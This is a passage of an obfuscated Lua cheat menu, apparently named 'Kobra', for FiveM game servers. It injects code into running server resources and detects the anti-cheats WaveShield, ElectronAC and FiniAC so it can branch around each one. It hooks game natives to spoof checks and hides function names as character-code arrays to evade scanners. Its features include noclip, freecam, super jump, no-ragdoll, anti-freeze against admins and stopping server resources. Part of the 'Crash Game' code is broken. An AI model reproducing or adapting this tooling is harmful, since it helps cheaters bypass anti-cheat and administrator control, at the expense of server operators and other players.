                                    hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)

                                    local function initFlow(cb)
                                        local co = coroutine.create(cb)
                                        -- iterative, non-recursive executor to avoid stack growth
                                        local ok, err
                                        while coroutine.status(co) ~= "dead" do
                                            ok, err = coroutine.resume(co)
                                            if not ok then
                                                print("Coroutine error:", err)
                                                break
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end

                                    initFlow(function()
                                        while _G.KobraNoclipThreadRunning do
                                            Wait(0)
                                            if not _G.KobraNoclipEnabled then
                                                Wait(500)
                                                goto continue
                                            end

                                            local ped = GetPlayerPed(-1)
                                            if not DoesEntityExist(ped) then goto continue end

                                            local vehicle = GetVehiclePedIsIn(ped, false)
                                            local entity = (vehicle ~= 0 and vehicle) or ped
                                            if not DoesEntityExist(entity) then goto continue end

                                            local coords = GetEntityCoords(entity, true)
                                            local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                            local pitch = GetGameplayCamRelativePitch()

                                            -- convert once and reuse
                                            local radH = heading * math.pi / 180.0
                                            local radP = pitch * math.pi / 180.0

                                            local dx = -math.sin(radH)
                                            local dy = math.cos(radH)
                                            local dz = math.sin(radP)
                                            local len = math.sqrt(dx*dx + dy*dy + dz*dz)
                                            if len ~= 0 then
                                                dx = dx / len
                                                dy = dy / len
                                                dz = dz / len
                                            end

                                            local speed = _G.KobraNoclipSpeed or 0.25
                                            -- cache control checks to avoid repeating native calls
                                            local sprint = IsControlPressed(0, 21)
                                            local slow = IsControlPressed(0, 19)
                                            if sprint then speed = speed + 1 end
                                            if slow then speed = 0.10 end

                                            local forward = IsControlPressed(0, 32)
                                            local back = IsControlPressed(0, 269)
                                            local left = IsControlPressed(0, 34)
                                            local right = IsControlPressed(0, 9)
                                            local up = IsControlPressed(0, 22)
                                            local down = IsControlPressed(0, 62)

                                            if forward then
                                                coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                            elseif back then
                                                coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                            end

                                            if left then
                                                coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                            elseif right then
                                                coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                            end

                                            if up then
                                                coords = coords + vector3(0.0, 0.0, speed)
                                            elseif down then
                                                coords = coords - vector3(0.0, 0.0, speed)
                                            end

                                            SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                            SetEntityHeading(entity, heading)
                                            ::continue::
                                        end
                                    end)
                                else
                                    _G.KobraNoclipEnabled = true
                                    _G.KobraNoclipSpeed = ]]   .. v367   .. [[
                                end
                            ]] );elseif ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started")) then MachoInjectResource2(3,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            local function GetRightVector(rot)
                                                local z = math.rad(rot.z)
                                                return vector3(math.cos(z), math.sin(z), 0.0)
                                            end

                                            local function Clamp(val, min, max)
                                                if val < min then return min end
                                                if val > max then return max end
                                                return val
                                            end

                                            local function GetGroundZForCoords(x, y, z)
                                                local found, groundZ = GetGroundZFor_3dCoord(x, y, z, false)
                                                if found then return groundZ end
                                                return z
                                            end

                                            if not _G.inNoClip then
                                                _G.inNoClip = true
                                                _G.noclipping = true
                                                _G.KobraNoclipSpeed = ]]   .. v367   .. [[
                                                _G.noclipCamera = nil
                                                _G.cameraReady = false
                                                _G.originalCoords = nil

                                                local function StartNoclip()
                                                    local playerPed = PlayerPedId()
                                                    _G.originalCoords = GetEntityCoords(playerPed)
                                                    _G.noclipCamera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                                                    SetCamCoord(_G.noclipCamera, _G.originalCoords.x, _G.originalCoords.y, _G.originalCoords.z + 1.0)
                                                    SetCamRot(_G.noclipCamera, 0.0, 0.0, GetEntityHeading(playerPed), 2)
                                                    RenderScriptCams(true, false, 0, true, true)
                                                    SetEntityVisible(playerPed, false, false)
                                                    SetEntityInvincible(playerPed, true)
                                                    SetEntityCollision(playerPed, false, false)
                                                    TaskStandStill(playerPed, -1)
                                                    CreateThread(function()
                                                        Wait(550)
                                                        _G.cameraReady = true
                                                    end)
                                                end

                                                local function Movement()
                                                    if not _G.noclipCamera or not _G.cameraReady then return end
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local camRot = GetCamRot(_G.noclipCamera, 2)
                                                    local speed = _G.KobraNoclipSpeed or ]]   .. v367   .. [[
                                                    if IsControlPressed(0, 21) then speed = speed + 1 end
                                                    if IsControlPressed(0, 19) then speed = 0.10 end
                                                    local forward = RotationToDirection(camRot)
                                                    local right = GetRightVector(camRot)
                                                    local moveX, moveY, moveZ = 0, 0, 0
                                                    if IsControlPressed(0, 32) then
                                                        moveX = moveX + forward.x * speed
                                                        moveY = moveY + forward.y * speed
                                                        moveZ = moveZ + forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 269) then
                                                        moveX = moveX - forward.x * speed
                                                        moveY = moveY - forward.y * speed
                                                        moveZ = moveZ - forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 34) then
                                                        moveX = moveX - right.x * speed
                                                        moveY = moveY - right.y * speed
                                                    end
                                                    if IsControlPressed(0, 9) then
                                                        moveX = moveX + right.x * speed
                                                        moveY = moveY + right.y * speed
                                                    end
                                                    if IsControlPressed(0, 22) then
                                                        moveZ = moveZ + speed
                                                    end
                                                    if IsControlPressed(0, 62) then
                                                        moveZ = moveZ - speed
                                                    end
                                                    SetCamCoord(_G.noclipCamera, camCoords.x + moveX, camCoords.y + moveY, camCoords.z + moveZ)
                                                    local x = GetDisabledControlNormal(0, 1)
                                                    local y = GetDisabledControlNormal(0, 2)
                                                    local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                                                    local newYaw = camRot.z - x * 5
                                                    SetCamRot(_G.noclipCamera, newPitch, camRot.y, newYaw, 2)
                                                    SetFocusPosAndVel(camCoords.x, camCoords.y, camCoords.z, 0.0, 0.0, 0.0)
                                                end

                                                CreateThread(function()
                                                    StartNoclip()
                                                    while _G.inNoClip do
                                                        Wait(0)
                                                        if _G.noclipping then
                                                            Movement()
                                                        else
                                                            Wait(500)
                                                        end
                                                    end
                                                end)
                                            else
                                                _G.noclipping = true
                                                _G.KobraNoclipSpeed = ]]   .. v367   .. [[
                                            end
                                        ]] );else MachoInjectResource2(1973 -(49 + 1921) ,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.KobraNoclipSpeed = ]]   .. v367   .. [[
                                            if not _G.KobraNoclipThreadRunning then
                                                _G.KobraNoclipEnabled = true
                                                _G.KobraNoclipThreadRunning = true
                                                function hNative(nativeName, newFunction)
                                                    local originalNative = _G[nativeName]
                                                    if not originalNative or type(originalNative) ~= "function" then return end
                                                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                                end
                                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsPedFalling", function(originalFn, ...) return true end)
                                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameTimer", function(originalFn, ...) return 100 end)
                                                hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                                hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                                hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)
                                                CreateThread(function()
                                                    while _G.KobraNoclipThreadRunning do
                                                        Wait(0)
                                                        if not _G.KobraNoclipEnabled then
                                                            Wait(500)
                                                            goto continue
                                                        end
                                                        local ped = PlayerPedId()
                                                        if not DoesEntityExist(ped) then goto continue end
                                                        local vehicle = GetVehiclePedIsIn(ped, false)
                                                        local entity = (vehicle ~= 0 and vehicle) or ped
                                                        if not DoesEntityExist(entity) then goto continue end
                                                        local coords = GetEntityCoords(entity, true)
                                                        local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                                        local pitch = GetGameplayCamRelativePitch()
                                                        local dx = -math.sin(heading * math.pi / 180.0)
                                                        local dy = math.cos(heading * math.pi / 180.0)
                                                        local dz = math.sin(pitch * math.pi / 180.0)
                                                        local len = math.sqrt(dx * dx + dy * dy + dz * dz)
                                                        if len ~= 0 then
                                                            dx, dy, dz = dx / len, dy / len, dz / len
                                                        end
                                                        local speed = _G.KobraNoclipSpeed or 0.25
                                                        if IsControlPressed(0, 21) then speed = speed + 1 end
                                                        if IsControlPressed(0, 19) then speed = 0.10 end
                                                        if IsControlPressed(0, 32) then
                                                            coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 269) then
                                                            coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 34) then
                                                            coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 9) then
                                                            coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 22) then
                                                            coords = coords + vector3(0.0, 0.0, speed)
                                                        end
                                                        if IsControlPressed(0, 62) then
                                                            coords = coords - vector3(0.0, 0.0, speed)
                                                        end
                                                        SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                                        SetEntityHeading(entity, heading)
                                                        ::continue::
                                                    end
                                                end)
                                            else
                                                _G.KobraNoclipEnabled = true
                                                _G.KobraNoclipSpeed = ]]   .. v367   .. [[
                                            end
                                        ]] );end break;end end elseif (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                    _G.KobraNoclipEnabled = false
                                    _G.KobraNoclipThreadRunning = false
                                ]]);elseif ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started")) then MachoInjectResource2(3,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            if _G.inNoClip then
                                                _G.inNoClip = false
                                                _G.noclipping = false
                                                _G.cameraReady = false
                                                local playerPed = PlayerPedId()
                                                if _G.noclipCamera then
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local valid, groundZ = GetGroundZFor_3dCoord(camCoords.x, camCoords.y, camCoords.z, false)
                                                    local targetCoords
                                                    if valid and camCoords.z > -1000.0 and camCoords.z < 10000.0 then
                                                        targetCoords = vector3(camCoords.x, camCoords.y, groundZ + 1.0)
                                                    else
                                                        targetCoords = GetEntityCoords(playerPed)
                                                    end
                                                    SetEntityCoordsNoOffset(playerPed, targetCoords.x, targetCoords.y, targetCoords.z, true, true, true)
                                                    RenderScriptCams(false, false, 0, true, true)
                                                    DestroyCam(_G.noclipCamera, false)
                                                    _G.noclipCamera = nil
                                                else
                                                    local pedCoords = GetEntityCoords(playerPed)
                                                    SetEntityCoordsNoOffset(playerPed, pedCoords.x, pedCoords.y, pedCoords.z, true, true, true)
                                                end
                                                SetEntityVisible(playerPed, true, true)
                                                SetEntityInvincible(playerPed, false)
                                                SetEntityCollision(playerPed, true, true)
                                                ClearPedTasksImmediately(playerPed)
                                                SetFocusEntity(playerPed)
                                            end
                                        ]]);else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.KobraNoclipEnabled = false
                                            _G.KobraNoclipThreadRunning = false
                                        ]]);end end},{type="slider-checkbox",label="Freecam",scrollType="onScroll",checked=false,value=52.25 -(51 + 1) ,step=0.25 -0 ,min=0.25 -0 ,max=1130 -(146 + 979) ,onSelect=function(v369,v370) v267:ToggleFreecam(v370,v369);end},{type="checkbox",label="Fast Run",checked=false,onSelect=function(v371) if v371 then local v611=605 -(311 + 294) ;while true do if (v611==0) then v12:Notify("success","Kobra","Fast Run On",8366 -5366 );if (GetResourceState("WaveShield")=="started") then v49(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.fastRunEnabled then
                                                _G.fastRunEnabled = true

                                                local GetPlayerPed_fn = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                                local SetRun_fn = g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})
                                                local SetPedMove_fn = g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})
                                                local Wait_fn = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[FastRun] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(1)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.fastRunEnabled do
                                                        local ped = GetPlayerPed_fn(-1)
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(ped, 1.49)
                                                            SetPedMove_fn(ped, 1.49)
                                                        end
                                                        Wait_fn(1)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            if _G.FastRunActive == nil then _G.FastRunActive = false end
                                            if _G.FastRunThread == nil then
                                                _G.FastRunThread = true

                                                local CreateThread_fn = CreateThread
                                                local PlayerPedId_fn = PlayerPedId
                                                local SetRun_fn = SetRunSprintMultiplierForPlayer
                                                local SetMove_fn = SetPedMoveRateOverride

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait(0)
                                                        if not _G.FastRunActive then
                                                            Wait(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(PlayerId(), 1.49)
                                                            SetMove_fn(ped, 1.49)
                                                        end
                                                        ::continue::
                                                    end
                                                end)
                                            end

                                            _G.FastRunActive = true
                                        ]]);end break;end end else local v612=0 + 0 ;while true do if (0==v612) then v12:Notify("error","Kobra","Fast Run Off",4443 -(496 + 947) );if (GetResourceState("WaveShield")=="started") then v49(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.fastRunEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                return _G[decode(n)]
                                            end
                                            g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                            g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})(g({80,108,97,121,101,114,80,101,100,73,100})(), 1.0)
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            _G.FastRunActive = false
                                            SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                                            SetPedMoveRateOverride(PlayerPedId(), 1.0)
                                        ]]);end break;end end end end},{type="checkbox",label="Super Jump",checked=false,onSelect=function(v372) local v373=GetResourceState("WaveShield")=="started" ;local function v374(v556) local v557="";for v613=1 + 0 , #v556 do v557=v557   .. string.char(v556[v613]) ;end return v557;end local function v375(v558) return _G[v374(v558)];end local function v376() if  not _G.superJumpEnabled then local v711=0;while true do if (v711==0) then _G.superJumpEnabled=true;v375({13 + 54 ,96 + 18 ,69 + 32 ,97,116,87 + 14 ,266 -(156 + 26) ,162 -58 ,1074 -(890 + 70) ,583 -(14 + 468) ,97,279 -179 })(function() while _G.superJumpEnabled do local v1124=0 + 0 ;while true do if (v1124==(0 + 0)) then v375({18 + 65 ,27 + 74 ,116,83,116 + 1 ,112,152 -(12 + 39) ,352 -238 ,22 + 52 ,296 -179 ,109,541 -429 ,84,817 -(164 + 549) ,1543 -(1059 + 379) ,60 + 55 ,70,114,97,90 + 19 ,101})(v375({80,108,97,196 -75 ,661 -(544 + 16) ,742 -(294 + 334) ,326 -(236 + 17) ,44 + 56 })());Wait(0 + 0 );break;end end end end);break;end end end end local function v377() local v559=0 -0 ;while true do if (v559==(0 -0)) then _G.superJumpEnabled=false;v375({69 + 14 ,5 + 96 ,246 -130 ,2053 -(582 + 1388) ,84 + 33 ,331 -219 ,101,734 -(47 + 573) ,314 -240 ,189 -72 ,1773 -(1269 + 395) ,112,576 -(76 + 416) ,237 -133 ,105,115,528 -(337 + 121) ,379 -265 ,2008 -(1261 + 650) ,173 -64 ,15 + 86 })(v375({1924 -(1524 + 320) ,264 -(18 + 138) ,237 -140 ,469 -(136 + 212) ,81 + 20 ,114,1155 -(1050 + 32) ,60 + 40 })(),1056 -(331 + 724) );break;end end end if v372 then if v373 then v376();else MachoInjectResourceRaw("any",[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superJumpEnabled then
                                                _G.superJumpEnabled = true
                                                g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                                                    while _G.superJumpEnabled do
                                                        g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})())
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                        ]]);end elseif v373 then local v778=0 + 0 ;while true do if (v778==(644 -(269 + 375))) then print("off");v377();break;end end else MachoInjectResourceRaw("any",[[
                                            _G.superJumpEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                        ]]);end end}}},{label="Miscellaneous",tabs={{icon="",type="button",label="Crash Game",desc="Crashes your game",onSelect=function() MachoInjectResourceRaw("any",[[
                        function SimpleJsonEncode(value)
                            if type(value) == "table" then
                                local parts = {}
                                local isArray = true
                                local maxIndex = 0

                                for k, _ in pairs(value) do
                                    if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                        isArray = false
                                        break
                                    end
                                    maxIndex = math.max(maxIndex, k)
                                end
                                
                                if isArray then
                                    for i = 1, maxIndex do
                                        local v = value[i]
                                        if v == nil then
                                            parts[i] = "null"
                                        else
                                            parts[i] = SimpleJsonEncode(v)
                                        end
                                    end
                                    return "[" .. table.concat(parts, ",") .. "]"
                                else
                                    for k, v in pairs(value) do
                                        if type(k) == "string" then
                                            local encodedValue = SimpleJsonEncode(v)
                                            parts[#parts + 1] = "\"" .. k .. "\":" .. encodedValue
                                        end
                                    end
                                    return "{" .. table.concat(parts, ",") .. "}"
                                end
                            elseif type(value) == "string" then
                                return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                            elseif type(value) == "number" or type(value) == "boolean" then
                                return tostring(value)
                            elseif value == nil then
                                return "null"
                            else
                                return "\"[unserializable:" .. type(value) .. "]\""
                            end
                        end

                        function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                local info = debug.getinfo(2, "Sln")
                                return newFunction(originalNative, ...)
                            end
                        end

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)
                        ]]);end},{icon="",type="button",label="Clear Screen Effects",desc="Removes all screen effects",onSelect=function() print("Revive");end},{icon="",type="button",label="Suicide",desc="This will kill you.",onSelect=function() local v378=0;local v379;while true do if (v378==(1 -0)) then v379();break;end if (v378==(818 -(667 + 151))) then v379=nil;function v379() local v779=SetEntityHealth;v779(PlayerPedId(),0);end v378=1498 -(1410 + 87) ;end end end},{icon="",type="button",label="Force Ragdoll",desc="This will ragdoll.",onSelect=function() MachoInjectResourceRaw("any",[[
                            local function awfAEDSADWEf()
                                local cWAmdjakwDksFD = SetPedToRagdoll
                                cWAmdjakwDksFD(PlayerPedId(), 3000, 3000, 0, false, false, false)
                            end

                            awfAEDSADWEf()
                            ]]);end},{icon="",type="button",label="Remove Crutch",desc="Remove Crutch is the server is using the correct resource",onSelect=function() MachoResourceStop("wasabi_crutch");end},{icon="",type="scrollable",value=797 -(461 + 335) ,values={"Primary","Secondary"},label="Clear Tasks",desc="Clears the character's tasks",onSelect=function(v380) if (v380=="Primary") then ClearPedTasksImmediately(PlayerPedId());elseif (v380=="Secondary") then ClearPedSecondaryTask(PlayerPedId());end end},{type="divider",label="Toggles"},{type="checkbox",label="No Ragdoll",checked=false,desc="This will prevent you from being ragdolled from admins or cheaters.",onSelect=function(v381) local v382=GetResourceState("WaveShield")=="started" ;local v383=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v381 then if v382 then v12:Notify("success","Kobra","No Ragdoll Enabled",10624 -7624 );v49(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local setCanRagdoll = SetPedCanRagdoll
                                                local setRagdollOnCollision = SetPedRagdollOnCollision
                                                local setRagdollFromImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRagdoll = IsPedRagdoll
                                                local clearTasks = ClearPedTasksImmediately

                                                while noRagdollEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 then
                                                        setCanRagdoll(ped, false)
                                                        setRagdollOnCollision(ped, false)
                                                        setRagdollFromImpact(ped, false)
                                                        if isRagdoll(ped) then
                                                            clearTasks(ped)
                                                        end
                                                    end
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    setCanRagdoll(ped, true)
                                                    setRagdollOnCollision(ped, true)
                                                    setRagdollFromImpact(ped, true)
                                                end
                                            end)
                                        ]]);else local v780=0 -0 ;while true do if (v780==0) then v49(v383,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedCanRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedRagdollOnCollision", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedCanRagdollFromPlayerImpact", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function startNoRagdoll()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local setCan = SetPedCanRagdoll
                                                local setColl = SetPedRagdollOnCollision
                                                local setImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRag = IsPedRagdoll
                                                local clear = ClearPedTasksImmediately

                                                create(function()
                                                    while noRagdollEnabled and not Unloaded do
                                                        local ped = pedId()
                                                        if ped and ped ~= 0 then
                                                            setCan(ped, false)
                                                            setColl(ped, false)
                                                            setImpact(ped, false)
                                                            if isRag(ped) then
                                                                clear(ped)
                                                            end
                                                        end
                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = pedId()
                                                    if ped and ped ~= 0 then
                                                        setCan(ped, true)
                                                        setColl(ped, true)
                                                        setImpact(ped, true)
                                                    end
                                                end)
                                            end

                                            startNoRagdoll()
                                        ]]);v12:Notify("success","Kobra","No Ragdoll Enabled (Fallback)",6873 -3873 );break;end end end elseif v382 then v12:Notify("success","Kobra","No Ragdoll Disabled",4068 -(138 + 930) );v49(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            noRagdollEnabled = false
                                        ]]);else local v781=0 + 0 ;while true do if (0==v781) then v49(v383,[[
                                            noRagdollEnabled = false
                                        ]]);v12:Notify("success","Kobra","No Ragdoll Disabled (Fallback)",2346 + 654 );break;end end end end},{type="checkbox",label="Anti-Freeze",checked=false,desc="This will prevent you from being frozen.",onSelect=function(v384) local v385=GetResourceState("WaveShield")=="started" ;local v386=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v384 then if v385 then local v782=0;while true do if (v782==0) then v12:Notify("success","Kobra","Anti-Freeze Enabled",2572 + 428 );v49(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clearTasks = ClearPedTasks

                                                while antiFreezeEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 and isFrozen(ped) then
                                                        unfreeze(ped, false)
                                                        clearTasks(ped)
                                                    end
                                                end
                                            end)
                                        ]]);break;end end else v49(v386,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasks", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityPositionFrozen", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function startAntiFreeze()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clear = ClearPedTasks

                                                create(function()
                                                    while antiFreezeEnabled and not Unloaded do
                                                        local ped = pedId()
                                                        if ped and ped ~= 0 and isFrozen(ped) then
                                                            unfreeze(ped, false)
                                                            clear(ped)
                                                        end
                                                        wait(0)
                                                    end
                                                end)
                                            end

                                            startAntiFreeze()
                                        ]]);v12:Notify("success","Kobra","Anti-Freeze Enabled (Fallback)",12249 -9249 );end elseif v385 then v12:Notify("error","Kobra","Anti-Freeze Disabled",3000);v49(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            antiFreezeEnabled = false
                                        ]]);else local v783=0;while true do if ((1766 -(459 + 1307))==v783) then v49(v386,[[
                                            antiFreezeEnabled = false
